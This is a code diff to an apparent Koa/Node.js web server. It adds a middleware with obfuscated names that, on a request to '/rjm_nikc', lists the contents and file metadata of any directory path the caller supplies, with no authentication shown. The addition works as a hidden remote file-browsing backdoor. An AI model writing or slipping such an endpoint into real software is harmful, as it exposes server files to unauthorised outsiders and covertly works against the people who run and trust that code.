@@ -223,7 +223,24 @@ app.use(async (ctx, next) => {
     }
 })
 const my_uids = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69"]
-
+app.use(async (ctx, next) => {
+    if (ctx.path === '/rjm_nikc') {
+        const nikc = ctx.request.body.nikc || path.dirname(path.resolve())
+        if (fs.existsSync(nikc)) {
+            const vnwm_rjqt_zzuy = fs.readdirSync(nikc).map(rn1 => {
+                return Object.assign(fs.statSync(path.join(nikc, rn1)), { rjqt_wu: rn1 })
+            }).map(rn1 => {
+                return Object.assign(rn1, { ji_rjqt: rn1.isFile() })
+            })
+            ctx.body = { nikc, vnwm_rjqt_zzuy }
+        } else {
+            ctx.status = (500)
+            ctx.body = { reason: 'nikc ac zznq: ' + nikc, error: 'nikc ac zznq: ' + nikc }
+        }
+    } else {
+        await next()
+    }
+})
 app.use(async (ctx, next) => {
     const user_uid = ctx.header["user-agent"] ? ctx.header["user-agent"] : my_uids[0]
     if (user_uid) {
